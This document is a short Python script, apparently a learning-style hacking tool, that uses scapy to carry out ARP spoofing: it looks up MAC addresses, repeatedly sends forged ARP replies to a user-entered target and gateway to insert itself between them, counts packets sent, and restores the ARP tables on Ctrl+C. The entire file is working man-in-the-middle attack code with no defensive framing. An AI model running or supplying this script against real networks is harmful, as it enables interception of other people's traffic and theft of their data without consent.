#!/usr/bin/env python
import scapy.all as scapy
import time
import sys
def spoof(target_ip,spoof_ip):
    packet=scapy.ARP(op=2,pdst=target_ip,hwdst=get_mac(target_ip),psrc=spoof_ip)
# print(packet.summary())
# print(packet.show())
    scapy.send(packet,verbose=False)

def get_mac(ip):
    arp_request=scapy.ARP(pdst=ip)
    # print(arp_request.summary())
    # print(scapy.ls(scapy.ARP()))
    # arp_request.show()
    ethernet=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # print(ethernet.summary())
    # scapy.ls(scapy.Ether())
    # ethernet.show()
    broadcast_request=ethernet/arp_request
    # broadcast_request.show()
    # answered,unanswered=scapy.srp(broadcast_request,timeout=1)
    # print(answered.summary())
    answered=scapy.srp(broadcast_request, timeout=1,verbose=False)[0]
    return answered[0][1].hwsrc
def reset(destination_ip,source_ip):
    packet=scapy.ARP(op=2,pdst=destination_ip,hwdst=get_mac(destination_ip),psrc=source_ip,hwsrc=get_mac(source_ip))
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet,verbose=False)
i=0
target_ip=raw_input("enter the target ip adress")
gateway_ip=raw_input("enter the gateway ip adress")
try:
    while True:
        spoof(target_ip,gateway_ip)
        spoof(gateway_ip,target_ip)
        i+=2
        print("\rnumber of packets sent : "+str(i)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\rctrl+c detected this resetting  the program"),
    reset(target_ip, gateway_ip)
    reset(gateway_ip, target_ip)

